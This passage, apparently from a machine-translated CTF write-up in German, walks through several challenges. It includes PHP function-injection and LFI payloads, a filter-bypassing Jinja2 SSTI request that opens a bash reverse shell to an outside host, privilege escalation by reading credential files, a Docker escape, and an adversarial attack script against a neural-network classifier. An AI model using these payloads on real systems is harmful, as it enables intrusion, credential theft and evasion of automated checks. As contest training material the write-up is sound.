<i>Congratz.</i>  <i>Jetzt können Sie Quellen lesen.</i>  <i>Geh tiefer.</i> </li><li>  Funktionsinjektion (FI) am <i>Filtereingang</i> . </li><li>  Die Validierung des Bild-Uploads ist für uns jetzt klar. </li><li>  Die ImageMagic-Bibliothek wird verwendet.  Die Annahme, dass es für Exploit verwendet wird, ist eine Sackgasse.  Ich glaube nicht, dass es eine Möglichkeit gibt, es auszunutzen, ohne sich auf FI zu verlassen. </li></ul><br><h4>  Sicherheitslücke: Funktionsinjektion </h4><br>  Die Datei <b>upload.php</b> enthält verdächtigen Code: <br><br><pre> <code class="php hljs">$filterImage = $_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]($size, $text);</code> </pre> <br>  Wir können es vereinfachen, um: <br><br><pre> <code class="php hljs">$filterImage = $_GET[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>](intval($_GET[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]), $_GET[<span class="hljs-string"><span class="hljs-string">'text'</span></span>]);</code> </pre> <br>  Sie können diese Sicherheitsanfälligkeit tatsächlich erkennen, indem Sie etwas Fuzzing durchführen.  Das Senden von Funktionsnamen wie " <b>var_dump</b> " oder " <b>debug_zval_dump</b> " in der ' <b>Filter'</b> -Eingabe führt zu interessanten Antworten vom Server. <br><br><pre> <code class="plaintext hljs">int(51) string(10) "jsdksjdksds"&lt;/code&gt; So, its not hard to guess how server side code looks like. If we had an write permission to www root, than we could just use two functions: &lt;code&gt;file_put_contents(0, "&lt;?php system($_GET[a]);") chmod(0, 777)</code> </pre> <br>  Aber das ist nicht unser Fall.  Es gibt mindestens zwei Möglichkeiten, die Aufgabe zu lösen. <br><br><h4>  filter_input_array vector (unbeabsichtigte Lösung): RCE-Vektor </h4><br>  Als ich über mögliche Wege <code>function filter_input_array</code> , um RCE zu erhalten, bemerkte ich, dass die <code>function filter_input_array</code> uns eine ziemlich gute Kontrolle über die <code>$filterImage variable</code> . <br><br>  Wenn Sie das <b>Filterarray</b> als zweites Argument übergeben, können Sie ein beliebiges Array für das Funktionsergebnis erstellen. <br><br>  Aber ImageMagic erwartet nichts anderes als die Imagick-Klasse.  :( <br><br>  Vielleicht können wir die Klasse aus der Eingabe unserialisieren?  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Suchen</a> wir nach zusätzlichen Filterargumenten in der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Beschreibung filter_input_array</a> . <br><br>  Es wird nicht auf der Funktionsseite selbst erwähnt, aber wir können tatsächlich einen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Rückruf zur Eingabevalidierung übergeben</a> .  Das Beispiel FILTER_CALLBACK gilt für <code>filter_input</code> , funktioniert aber auch für <code>filter_input_array</code> ! <br><br>  Dies bedeutet, dass wir benutzerdefinierte Benutzereingaben mithilfe einer Funktion mit einem Argument (eval? System?) "Validieren" können und die Kontrolle über das Argument haben. <br><br><pre> <code class="plaintext hljs">FILTER_CALLBACK = 1024</code> </pre> <br>  Beispiel für das Abrufen von RCE: <br><br><pre> <code class="plaintext hljs">GET: a=/get_the_flag POST: filter=filter_input_array size=1 text[a][filter]=1024 text[a][options]=system submit=1</code> </pre> <br>  Antwort: <br><br><pre> <code class="plaintext hljs">*** Wooooohooo! *** Congratulations! Your flag is: 1m_t3h_R34L_binaeb_g1mme_my_71ck37 -- SPbCTF (vk.com/spbctf)</code> </pre> <br>  <b>Gesuchte</b> Zeile: <b>1m_t3h_R34L_binaeb_g1mme_my_71ck37</b> <br><br>  Etwas fühlte sich definitiv falsch an, denn warum sollten wir überhaupt den Quellcode bekommen müssen?  Nur für einen Hinweis?  Warum hochgeladene Dateien auf der Festplatte gespeichert wurden, ist es nicht bequemer, keine Junk-Dateien von den Challenge-Benutzern zu speichern? <br><br>  Der Zufall bei der Benennung von <b>filter</b> = <b>filter</b> _input_array, text [a] [ <b>filter</b> ] gab mir die Gewissheit, dass alles wie erwartet durchgeführt wurde ("nie zuvor gesehene <b>Filter</b> ", siehe ✓). <br><br><h4>  spl_autoload-Vektor: LFI-Vektor </h4><br>  Nachdem ich die Lösung eingereicht hatte, wurde ich von einem der Herausforderungsautoren kontaktiert, der sagte, dass mein Vektor nicht beabsichtigt war und eine andere Funktion verwendet werden kann ( <code>spl_autoload</code> ): <br><br>  Es ist nicht offensichtlich, wie wir diese Funktion verwenden können, da sie eine Klasse "&lt;Klassenname&gt;" aus der Datei "&lt;Klassenname&gt; &lt;Eine_Erweiterung&gt;" laden soll.  Die Unterschrift lautet wie folgt: <br><br><pre> <code class="php hljs">void spl_autoload ( string $class_name [, string $file_extensions = spl_autoload_extensions() ] )</code> </pre> <br>  Unser erstes Argument kann nur Nummer (1-512) sein, daher ist der <i>Klassenname</i> eine ... Nummer? ... seltsam. <br>  <i>Das Erweiterungsargument</i> sieht auch unbrauchbar aus. Kontrollierte Dateien sind eine Ebene tiefer als <b>upload.php</b> (wir müssen ein Präfix übergeben). <br><br>  Diese Funktion kann uns tatsächlich einen LFI geben, wenn sie folgendermaßen verwendet wird: <br><br><pre> <code class="plaintext hljs">spl_autoload(51, "a8ae2cab09c6b728919fe09af57ded/1.jpg") = include("51a8ae2cab09c6b728919fe09af57ded/1.jpg")</code> </pre> <br>  Der Verzeichnisname wird aus dem durchgesickerten Quellcode ermittelt.  Und wir hatten Glück, denn wenn das erste Zeichen des Namens etwas anderes als eine Zahl wäre -&gt; könnten wir keine Dateien von dort einschließen. <br><br>  Also ... alles was wir jetzt brauchen ist eine "Art-of- <b>Valid</b> " ( <b>getimagesize</b> muss es akzeptieren) <b>* .jpg-</b> Datei mit emendiertem PHP-Code zu übergeben.  Ein einfaches Beispiel (PHP Payload in Exif) ist beigefügt. <br><br>  <i>Laden Sie</i> es als <i>1111.jpg hoch</i> und führen Sie <i>Folgendes aus</i> : <br><br>  GET: <br>  a = / get_the_flag <br><br>  POST: <br>  filter = spl_autoload <br>  Größe = 51 <br>  text = a8ae2cab09c6b728919fe09af57ded / 1111.jpg <br>  submit = 1 <br><br>  Antwort: <br> <code>... .JFIF ... Exif MM * . " (. . .i . . D . D .. V .. <br> *** Wooooohooo! *** <br> <br> Congratulations! Your flag is: <br> 1m_t3h_R34L_binaeb_g1mme_my_71ck37 <br> <br> -- SPbCTF (vk.com/spbctf)</code> <br>  <b>Gesuchte</b> Zeile: <b>1m_t3h_R34L_binaeb_g1mme_my_71ck37</b> <br>  Upload und LFI können in einer Anfrage durchgeführt werden. <br><br><img src="https://habrastorage.org/webt/ya/ss/ns/yassnsu_przliwzh-nj1s0sm1gs.jpeg"><br><br><h2><a name="Time"></a>  Tag 5.  Zeit </h2><br>  Diese Aufgabe wurde vom <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Digital Security-Team</a> vorbereitet <br>  <i>Das erste, was Sie brauchen, ist, die Zeit zu unterdrücken, das zweite ist, über die kleine Welt hinauszugehen.</i>  <i>Danach bekommst du eine Waffe gegen das Boss-Endlevel.</i>  <i>Viel Glück!</i> <i><br><br></i>  <i>51.15.75.80</i> <i><br></i> <br>  <b>Hinweise</b> <br>  <i><b>27.10.2008 16:00</b></i> <i><br></i>  <i>Oh, wie viele Geräte auf einer Box ... sind sie wirklich nützlich?</i> <i><br></i>  <i><b>27.10.2008 14:35</b></i> <i><br></i>  <i>Wenn Sie mit dem Filter im Zeitfenster fertig wurden, können Sie die Funktionen eines gesamten Systems nutzen.</i>  <i>Sei nicht schüchtern.</i> <i><br></i>  <i><b>27.10.2008 14:25</b></i> <i><br></i>  <i>Überprüfen Sie den virtuellen Host und verweilen Sie nicht bei 200</i> <i><br></i>  <i><b>26.10.2008 19:25</b></i> <i><br></i>  <i>Aufgabe wurde nicht gelöst.</i>  <i>24 Stunden hinzugefügt.</i> <i><br></i>  <i><b>26.10.2008 17:35</b></i> <i><br></i>  <i>Nutzen Sie alle Ihre Möglichkeiten.</i> <i><br></i>  <i><b>26.10.2008 12:25</b></i> <i><br></i>  <i>Sie benötigen keine forensische Software, um eine Phase einer Aufgabe abzuschließen.</i> <br><br><h4>  1) WordPress </h4><br>  Zunächst erhielten wir die Adresse <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">51.15.75.80</a> . <br>  Wir führen hehdirb aus - wir sehen das Verzeichnis / wordpress /.  Gehen Sie sofort zum Admin-Bereich unter <i>admin: admin</i> . <br>  Im Admin-Bereich sehen wir, dass es keine Berechtigungen zum Ändern von Vorlagen gibt, sodass Sie nicht nur RCE erhalten können.  Es gibt jedoch einen versteckten Beitrag: <br>  <i>25.09.2008 VON ADMINISTRATOR</i> <i><br></i>  <i>Privat: Hinweise zum Zeitfenster</i> <i><br></i>  <i>Login: Cristopher</i> <i><br></i>  <i>Passwort: L2tAPJReLbNSn085lTvRNj</i> <i><br></i>  <i>Host: timepanel.zn</i> <br><br><h4>  2) SSTI </h4><br>  <b>Natürlich</b> müssen Sie zum selben Server <b>wechseln,</b> indem Sie das virtuelle Host <b>timepanel.zn angeben.</b> <br>  Wir starten hehdirb auf diesem Host - wir sehen das Verzeichnis / adm_auth, wir gehen unter dem oben angegebenen Login und Passwort.  Wir sehen die Form, in der Sie die Daten ("von" und "bis") eingeben müssen, um einige Informationen zu erhalten.  Gleichzeitig wird im Antwort-HTML-Code ein Kommentar angezeigt, in dem dieselben Daten wiedergegeben werden: <br><br><pre> <code class="plaintext hljs">&lt;!- start time: 2018-10-25 20:00:00, finish time:2018-10-26 20:00:00 -&gt;</code> </pre> <br>  Offensichtlich sollte der Fehler hier höchstwahrscheinlich mit dieser Überlegung zusammenhängen, und es ist unwahrscheinlich, dass es sich um XSS handelt. Versuchen Sie es also mit SSTI: <br><br><pre> <code class="plaintext hljs">start=2018-10-25+20%3A00%3A00{{ 1 * 0 }}&amp;finish=2018-10-26+20%3A00%3A00</code> </pre> <br>  Die Antwort lautet: <br><br><pre> <code class="plaintext hljs">&lt;!- start time: 2018-10-25 20:00:000, finish time:2018-10-26 20:00:00 -&gt;</code> </pre> <br>  Durch das Senden von {{self}}, {{'a' * 5}} erkennen wir, dass dies <b>Jinja2 ist</b> , aber Standardvektoren funktionieren nicht.  Beim Senden von Vektoren ohne {{Klammern}} sehen wir, dass die Antwort nicht die Zeichen "_" und einige Wörter, z. B. "Klasse", widerspiegelt.  Dieser Filter kann leicht umgangen werden, indem request.args und das Konstrukt | attr () verwendet werden und einige Bytes mit einer Escape-Sequenz codiert werden. <br><br><div class="spoiler">  <b class="spoiler_title">Letzte Abfrage für Backconnect</b> <div class="spoiler_text"> <code>POST /adm_main?sc=from+subprocess+import+check_output%0aRUNCMD+%3d+check_output&amp;cmd=bash+-c+'bash+-i+&gt;/dev/tcp/deteact.com/8000+&lt;%261' HTTP/1.1 <br> Host: timepanel.zn <br> Content-Type: application/x-www-form-urlencoded <br> Content-Length: 616 <br> Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.DrOOLQ.ROX16sOUD_7v5Ct-dV5lywHj0YM <br> <br> start={{ ''|attr('\x5f\x5fcl\x61ss\x5f\x5f')|attr('\x5f\x5f\x6dro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(2)|attr('\x5f\x5fsubcl\x61sses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(40)('/var/tmp/BECHED.cfg','w')|attr('write')(request.args.sc) }} <br> {{ ''|attr('\x5f\x5fcl\x61ss\x5f\x5f')|attr('\x5f\x5f\x6dro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(2)|attr('\x5f\x5fsubcl\x61sses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(40)('/var/tmp/BECHED.cfg')|attr('read')() }} <br> {{ config|attr('from\x5fpyfile')('/var/tmp/BECHED.cfg') }} <br> {{ config['RUNCMD'](request.args.cmd,shell=True) }} <br> &amp;finish=2018-10-26+20%3A00%3A00</code> <br> </div></div><br><h4>  3) LPE </h4><br>  Nachdem Sie RCE erhalten haben, müssen Sie die Berechtigungen für root erhöhen.  Es gibt mehrere falsche Pfade (/ usr / bin / special, /opt/privesc.py und einige weitere), die Sie nicht beschreiben möchten, da sie nur einige Zeit in Anspruch nehmen.  Es gibt auch ein binar / usr / bin / zero, das kein suid-Bit hat, aber es stellt sich heraus, dass es alle Dateien lesen kann (senden Sie ihm einfach den hexadezimal codierten Pfad in stdin). <br><br>  Der Grund sind Funktionen (/ usr / bin / zero = cap_dac_read_search + ep). <br>  Wir lesen den Schatten, setzen den zu bürstenden Hash, aber während er gebürstet wird, müssen wir vermutlich die Datei eines anderen Benutzers lesen, der sich auf dem System befindet: <br><br> <code>$ echo /home/cristopher/.bash_history | xxd -p | zero</code> <br> <br>  <i>Ich kann etwas für dich lesen</i> <i><br></i>  <i>su</i> <i><br></i>  <i>Dpyax4TkuEVVsgQNz6GUQX</i> <br><br><h4>  4) Docker Flucht / Forensik </h4><br>  Wir haben also eine Wurzel.  Dies ist jedoch nicht das Ende.  Wir <i>setzen apt install extundelete</i> und finden einige weitere interessante Dateien im Dateisystem, die sich auf die nächste Stufe beziehen: <br><br>  <i>Um ein Ticket zu erhalten, müssen Sie ein Bild so ändern, dass es als "1" gekennzeichnet ist.</i>  <i>Sie haben ein Modell und ein Bild.</i>  <i>curl -X POST -F image=@ZeroSource.bmp 'http://51.15.100.188 {6491 / Predict'.</i> <br><br>  Jetzt stehen wir vor der Standardaufgabe, ein wettbewerbsfähiges Beispiel für das Modell des maschinellen Lernens zu generieren.  Zu diesem Zeitpunkt konnte ich jedoch noch nicht alle benötigten Dateien abrufen.  Dies war nur möglich, indem der R-Studio-Agent auf den Server gestellt und die Remote-Forensik in Angriff genommen wurde.  Nachdem ich fast das herausgezogen hatte, was ich brauchte, stellte ich fest, dass der Docker-Container tatsächlich in einem Modus ausgeführt wird, in dem Sie die gesamte Festplatte bereitstellen können <br><br>  Wir machen mount / dev / vda1 / root / kek und erhalten Zugriff auf das Host-Dateisystem und gleichzeitig Root-Zugriff auf den gesamten Server (da wir unseren eigenen SSH-Schlüssel setzen können).  Wir nehmen KerasModel.h5, ZeroSource.bmp heraus. <br><br><h4>  5) Widersprüchliche ML </h4><br>  Aus dem Bild ist sofort ersichtlich, dass das neuronale Netzwerk auf dem MNIST-Datensatz trainiert wird.  Wenn wir versuchen, ein beliebiges Bild an den Server zu senden, erhalten wir die Antwort, dass sich die Bilder zu stark unterscheiden.  Dies bedeutet, dass der Server den Abstand zwischen den Vektoren misst, da er genau ein gegnerisches Beispiel und nicht nur ein Bild mit dem Bild „1“ möchte. <br><br>  Wir versuchen den ersten Angriff, den wir von der Narrenbox bekommen - wir bekommen den Angriffsvektor, aber der Server akzeptiert ihn nicht (die Entfernung ist zu groß).  Dann ging ich in die Wildnis und fing an, One Pixel Attack-Implementierungen unter MNIST neu zu erstellen, und es kam nichts dabei heraus, da dieser Angriff den Differential-Evolutions-Algorithmus verwendet, kein Gradient ist und versucht, das Minimum stochastisch zu finden, geleitet von Änderungen im Wahrscheinlichkeitsvektor.  Der Wahrscheinlichkeitsvektor änderte sich jedoch nicht, da das neuronale Netzwerk zu sicher war. <br><br>  Am Ende musste ich mich an den Hinweis erinnern, der in der Originaltextdatei auf dem Server war - "(Normilize ^ _ ^)".  Nach sorgfältiger Normalisierung war es möglich, den Angriff mithilfe des L-BFGS-Optimierungsalgorithmus effektiv auszuführen. Nachfolgend ist der letzte Exploit aufgeführt: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> foolbox <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> keras <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> numpy <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> np <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> foolbox.attacks <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> LBFGSAttack <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> foolbox.criteria <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> TargetClassProbability <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> keras.models <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> load_model <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> PIL <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> Image image = Image.open(<span class="hljs-string"><span class="hljs-string">'./ZeroSource.bmp'</span></span>) image = np.asarray(image, dtype=np.float32) / <span class="hljs-number"><span class="hljs-number">255</span></span> image = np.resize(image, (<span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) kmodel = load_model(<span class="hljs-string"><span class="hljs-string">'KerasModel.h5'</span></span>) fmodel = foolbox.models.KerasModel(kmodel, bounds=(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) adversarial = image[:, :] <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: attack = LBFGSAttack(model=fmodel, criterion=TargetClassProbability(<span class="hljs-number"><span class="hljs-number">1</span></span>, p=<span class="hljs-number"><span class="hljs-number">.5</span></span>)) adversarial = attack(image[:, :], label=<span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">except</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">'FAIL'</span></span> quit() <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> kmodel.predict_proba(adversarial.reshape(<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) adversarial = np.array(adversarial * <span class="hljs-number"><span class="hljs-number">255</span></span>, dtype=<span class="hljs-string"><span class="hljs-string">'uint8'</span></span>) im = Image.open(<span class="hljs-string"><span class="hljs-string">'ZeroSource.bmp'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> x <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">28</span></span>): <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> y <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">28</span></span>): im.putpixel((y, x), int(adversarial[x][y][<span class="hljs-number"><span class="hljs-number">0</span></span>])) im.save(<span class="hljs-string"><span class="hljs-string">'ZeroSourcead1.bmp'</span></span>) os.system(<span class="hljs-string"><span class="hljs-string">"curl -X POST -F image=@ZeroSourcead1.bmp 'http://51.15.100.188:36491/predict'"</span></span>)</code> </pre> <br>  <b>Gesuchte</b> Zeile: <b>H3y_Y0u'v_g01_4_n1c3_t1cket</b> <br><br><img src="https://habrastorage.org/webt/z0/tj/mx/z0tjmxh38kcphl5dxja6n9scepc.jpeg"><br><br><h2><a name="Awesome_Vm"></a>  Tag 6.  Super vm </h2><br>  Diese Aufgabe wurde vom <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">CTF-</a> Team der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Schule</a> vorbereitet. <br>  <i>Schauen Sie sich einen neuen Schulungsservice an!</i>  <i>zn.sibears.ru:8000</i> <i><br><br></i>  <i>Im Moment möchten wir Sie an einem Beta-Test einer neuen virtuellen Maschine beteiligen, die speziell zum Testen der Programmierkenntnisse unserer Neulinge entwickelt wurde.</i>  <i>Wir haben den intellektuellen Schutz vor Betrug hinzugefügt und möchten nun alles gründlich überprüfen, bevor wir das Platfotm anbieten.</i>  <i>Mit der VM können Sie einfache Programme ausführen ... oder nicht nur ?!</i> <i><br><br></i>  <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">goo.gl/iKRTrH</a></i> <br><br>  <b>Hinweise</b> <br>  <i><b>27.10.2008 16:20</b></i> <i><br></i>  <i>Vielleicht können Sie das KI-System täuschen oder umgehen?</i> <br><br><h4>  Beschreibung: </h4><br><img src="https://habrastorage.org/webt/8k/p1/xy/8kp1xynj1xl3s7xtbs4_jznf0k4.png"><br><br>  Der Dienst ist ein Validierungssystem für Dateien mit der Erweiterung .cmpld, die vom sibVM-Interpreter akzeptiert wird.  Die Aufgabe, die das gesendete Programm lösen sollte: Berechnen Sie die Summe der in der Datei input.txt aufgelisteten Zahlen, die etwas an einen acm-Wettbewerb erinnern.  Die Beschreibung der Weboberfläche zeigt auch an, dass die gesendeten Programme mit künstlicher Intelligenz überprüft werden. <br><br>  Der Dienst besteht aus zwei Docker-Containern: <b>Web-Docker</b> und <b>prod_inter</b> . <br><br>  <b>Web-Docker ist</b> für die Analyse nicht besonders interessant.  Er übersetzt lediglich die gesendete Datei in den Container prod_inter, in dem das Interessanteste passiert.  Das entsprechende Code-Snippet ist unten dargestellt: <br><img src="https://habrastorage.org/webt/ca/xv/em/caxvem0icoy4awon-funprflkps.jpeg"><br><br>  Im Container <b>prod_inter</b> wird die gesendete Datei geprüft und an Testdaten ausgeführt.  Für jeden Sendevorgang wird in / tmp / random ein neues Verzeichnis erstellt, in dem die gesendete Datei unter einem zufälligen Namen gespeichert wird.  Die Datei flag.txt befindet sich ebenfalls im erstellten Verzeichnis, was wahrscheinlich unser Ziel ist. <br><br>  Dann beginnt der lustige Teil: Wenn die Datei größer als 8192 Bytes ist, wird die Eingabedatei des Programms mit künstlicher Intelligenz überprüft.  Die KI ist ein vorab trainiertes hochpräzises neuronales Netzwerk.  Wenn der Test erfolgreich war (Eingabedaten sind mehr als 8192 Byte und das neuronale Netzwerk hat sie der ersten Klasse zugewiesen), führt das Programm fünf verschiedene Tests aus, und das Ergebnis wird in einer Antwortnachricht gesendet und dem Benutzer angezeigt. <br><br>  Wenn die Größe der Eingabedaten weniger als 8192 Byte beträgt oder sie den Test durch das neuronale Netzwerk nicht bestanden haben, prüfen Sie das Programm vor dem Testen auf das Vorhandensein der Teilzeichenfolge flag.txt und auf Versuche, eine Datei mit demselben Namen zu öffnen.  Der Zugriff auf die Datei flag.txt wird überwacht, indem das Programm in der auf <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">SECCOMP-</a> Technologien basierenden <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">secfilter-</a> Sandbox ausgeführt und das Ausführungsprotokoll analysiert wird.  Unten finden Sie den entsprechenden Servicecode und ein Beispiel für ein Protokoll beim Versuch, eine verbotene Datei zu öffnen: <br><br><img src="https://habrastorage.org/webt/vq/6-/-h/vq6--he6uvlc2zh6mvkmaqjow6q.jpeg"><br><br><img src="https://habrastorage.org/webt/lj/wg/vn/ljwgvn5gexwp23syezju5uexfjc.jpeg"><br><br>  Um diese Aufgabe zu lösen, habe ich eine Reihe von Programmen für den sibVM-Interpreter generiert, die die Datei flag.txt öffnen und den numerischen Wert des i-ten Bytes der Datei anzeigen.  Gleichzeitig besteht jedes Programm erfolgreich den AI-Test.  Als nächstes wird eine Oberflächenanalyse des neuronalen Netzwerks und eine Beschreibung des Betriebs der virtuellen Maschine vorgestellt. <br><br><h4>  Neuronale Netzwerkanalyse </h4><br>  Das trainierte neuronale Netzwerkmodell ist in der Datei cnn_model.h5 enthalten.  Im Folgenden finden Sie allgemeine Informationen zur Netzwerkarchitektur. <br><br><img src="https://habrastorage.org/webt/lj/7a/jj/lj7ajjrgzgml68gsmqsukdrn7wa.jpeg"><br><br>  Wir wissen nicht genau, was das neuronale Netzwerk erkennt, daher werden wir versuchen, ihm verschiedene Daten zuzuführen.  Aus der Architektur des Netzwerks geht hervor, dass es am Eingang ein Einkanalbild der Größe 100X100 empfängt.  Um die Auswirkung der Skalierung auf das Ergebnis zu vermeiden, verwenden wir Sequenzen von 10.000 Bytes, die mithilfe der im Dienst verwendeten Funktionen in ein Bild konvertiert wurden.  Nachfolgend sind die Ergebnisse des Betriebs eines neuronalen Netzwerks mit verschiedenen Daten aufgeführt: <br><br><img src="https://habrastorage.org/webt/s0/vd/tn/s0vdtnbuqcbnqxd1ho_5wzlyyps.jpeg"><br><br>  Basierend auf den Ergebnissen kann angenommen werden, dass das neuronale Netzwerk Bilder mit einer Dominanz von schwarzen Farben (null Bytes) empfängt.  Das Schreiben eines Programms, das Flaggenzeichen liest, erfordert höchstwahrscheinlich deutlich weniger als 1000 signifikante Bytes (der Rest kann mit Nullen gefüllt werden), und dann akzeptiert die KI das gesendete Programm. <br><br>  Dementsprechend bleibt es zur Lösung der Aufgabe, das gewünschte Programm zu schreiben. <br><br><h4>  SibVM-Dolmetscher </h4><br>  <b>Programmstruktur</b> <br>  Der erste Schritt besteht darin, die Struktur der Programmdatei zu verstehen.  Während der Umkehrung des Interpreters stellte sich heraus, dass das Programm mit einem bestimmten Header mit mehreren Servicefeldern beginnen sollte, gefolgt von einer Reihe von Entitäten mit Bezeichnern, unter denen sich eine Hauptentität vom Typ Function befinden sollte. <br><br><div class="spoiler">  <b class="spoiler_title">Dateikopfprüfung</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/2d/th/mb/2dthmbi3qyu4czj9qkc9zv8asam.png"><br></div></div><br><div class="spoiler">  <b class="spoiler_title">Datensätze abrufen</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/ab/vm/jb/abvmjbhfwcbxnu_nqxyue6pnlua.png"><br></div></div><br><div class="spoiler">  <b class="spoiler_title">Verarbeiten von Datensätzen und Starten der Hauptfunktion</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/eh/ki/qc/ehkiqcracavi3y75_bkj5kvcany.png"><br></div></div><br>  Das Ergebnis ist das folgende Eingabedateiformat: <br><br><img src="https://habrastorage.org/webt/ka/bs/py/kabspyig7f_jv7ysl_maco90itc.png"><br><br><h4>  Datentypen </h4><br>  Der Interpreter unterstützt verschiedene Arten von Entitäten.  Unten finden Sie eine Tabelle und ihre Bezeichner, die in Zukunft zum Erstellen des Programms benötigt werden. <br><br><img src="https://habrastorage.org/webt/jf/fd/wc/jffdwc5yc6beasqr57sr3goy6ks.jpeg"><br><br><h4>  Erstellen eines Programms für den Dolmetscher </h4><br>  Wie oben erwähnt, muss das Programm einen Haupteintrag vom Typ Funktion (5) haben.  Es hat das folgende Format: <br><br><img src="https://habrastorage.org/webt/bn/hw/g3/bnhwg3b5nh2egxv9dhi1aloarx8.png"><br><br>  Es war nicht schwierig, den Hauptzyklus der Programmausführung herauszufinden. <br><br><div class="spoiler">  <b class="spoiler_title">Hauptausführungszyklus</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/dl/ny/0r/dlny0rj2neh87uf72nljadx5bp0.png"><br></div></div><br>  Die Funktion <code>decode_opcode</code> ruft Informationen über die nächste Operation aus dem Programmcode ab.  Die ersten beiden Bytes jeder Operation enthalten den Operationscode, die Anzahl der Argumente und ihren Typ.  Die nächsten Bytes (abhängig von Typ und Anzahl der Argumente) werden als Argumente für die Operation interpretiert. <br><br>  Das Format der ersten beiden Bytes der Operation: <br><br><img src="https://habrastorage.org/webt/gn/70/av/gn70avw2rknailevx2byn4ezspw.png"><br><br>  Als Nächstes werden wir einige Anweisungen überprüfen, die uns helfen, das Flag aus dem System zu extrahieren. <br><br><div class="spoiler">  <b class="spoiler_title">Befehlsinterpreter-Diagramm, Funktion execute_opcode</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/ht/zm/pr/htzmprbyxebqmna2jg56vbi-jf4.png"><br></div></div><br><ul><li>  Opcode 0 - öffnet die Datei (der Dateiname wird durch das Operationsargument angegeben und ist vom Typ String) und platziert seinen Inhalt als Objekt vom Typ <code>ByteArray</code> oben auf dem Stapel. </li><li>  Opcode 2 - Zeigt den Wert an, der oben auf dem Stapel gespeichert ist.  Leider zeigt diese Operation nicht den Wert eines Objekts vom Typ <code>ByteArray</code> .  Um dieses Problem zu lösen, können Sie das i-te Element des Arrays abrufen und anzeigen. </li></ul><br><div class="spoiler">  <b class="spoiler_title">Opcode verarbeiten 2</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/or/vt/0p/orvt0pk4mokjuxbgw-yqjxpac8u.png"><br></div></div><br><ul><li>  Opcode 13 - Entnimmt ein Element aus einem Array nach Index.  Das Array und der Elementindex werden aus dem Stapel entfernt, das Ergebnis wird auf den Stapel verschoben.  Dementsprechend ist es zum Kompilieren eines Arbeitsprogramms erforderlich, den Index auf den Stapel zu setzen. </li><li>  Opcode 7 - schiebt das Operationsargument auf den Stapel. </li></ul><br>  Infolgedessen besteht das Programm nur aus 4 Operationen: <br><br><img src="https://habrastorage.org/webt/tx/t4/ga/txt4gaep-ibcfsdx0wco7gg_heg.jpeg"><br><br><img src="https://habrastorage.org/webt/ja/mv/nt/jamvnt3jnzj6xlj8pfn_vnd0dbc.png"><br><div class="spoiler">  <b class="spoiler_title">Endgültiges Programm</b> <div 